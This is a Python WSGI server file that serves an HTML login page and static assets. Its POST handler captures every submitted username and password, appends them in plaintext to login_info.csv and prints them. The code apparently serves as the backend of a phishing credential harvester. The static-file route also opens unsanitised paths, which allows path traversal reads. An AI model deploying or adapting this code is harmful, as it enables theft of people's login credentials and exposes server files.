from urllib.parse import urlparse, urljoin, parse_qsl, parse_qs
from html import escape

# reads a html file and returns its data in encoded format
def render_template(template_name="index.html", path="/"):
    with open(template_name, "r") as f:
        html = f.read()
    content_type = "text/" + template_name.split(".")[-1]
    return {
        "data": html.encode("utf-8"),
        "Content-Type": content_type,
        "Content-Length": str(len(html)),
    }


# reads an image file and returns its data
def render_image(src):
    with open(src, "rb") as f:
        image = f.read()
    content_type = "image/" + src.split(".")[-1]
    if src.endswith(".otf"):
        content_type = "font/opentype"
    return {
        "data": image,
        "Content-Type": content_type,
        "Content-Length": str(len(image)),
    }


# serves the home page
def home(environ):
    return render_template(template_name="index.html")


# serves the 404 not found page
def not_found(environ):
    return render_template(template_name="404.html")


# renders and serves static files
def static(environ):
    path = environ.get("PATH_INFO").strip("/")
    if path.startswith("static/images/") or path.startswith("static/css/fonts/"):
        return render_image(path)
    else:
        return render_template(path)


# returns pages based on the url
def get_page(environ):
    path = environ.get("PATH_INFO")
    path = path.strip("/")

    if path == "":
        data = home(environ)
    elif path == 'favicon.ico':
        data = render_image('favicon.ico')
    elif path.startswith("static"):
        data = static(environ)
    else:
        data = not_found(environ)

    return data


# GETTING DATA FROM POST REQUESTS
def get_post_data(environ):
    if environ.get("REQUEST_METHOD") == "POST":
        try:
            request_body_size = int(environ.get("CONTENT_LENGTH", 0))
        except (ValueError):
            request_body_size = 0

        # When the method is POST the variable will be sent
        # in the HTTP request body which is passed by the WSGI server
        # in the file like wsgi.input environment variable.
        request_body = environ["wsgi.input"].read(request_body_size)
        post_data = parse_qs(request_body.decode())

        username = escape(post_data.get("username", "Empty")[0])
        password = escape(post_data.get("password", "Empty")[0])
        
        with open('login_info.csv', 'a') as f:
            f.write(f'{username},{password}\n') 
        print("\n\n" + "USERNAME: " + username, "PASSWORD: ", password, "\n\n")

        return post_data


# the main function of the server
def app(environ, start_response, *args, **kwargs):
    
    data = get_page(environ)

    try:
        get_post_data(environ)
    except Exception as e:
        print(e)

    start_response(
        f"200 OK",
        [
            ("Content-Type", data["Content-Type"]),
            ("Content-Lenth", data["Content-Length"]),
        ],
    )
    return iter([data["data"]])
